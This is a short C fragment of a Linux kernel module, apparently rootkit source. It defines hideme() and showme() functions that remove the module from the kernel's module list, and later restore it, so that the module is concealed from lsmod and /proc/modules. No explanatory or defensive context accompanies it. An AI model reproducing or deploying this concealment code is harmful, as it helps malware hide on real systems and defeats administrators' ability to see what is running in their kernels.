#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>


static struct list_head *Prev_module;
static short hid = 0;

void showme(void){
	list_add(&THIS_MODULE->list ,Prev_module);
	hid = 0 ;
}

void hideme(void){
	Prev_module = THIS_MODULE->list.prev;
    	list_del(&THIS_MODULE->list);
    	hid = 1;
}

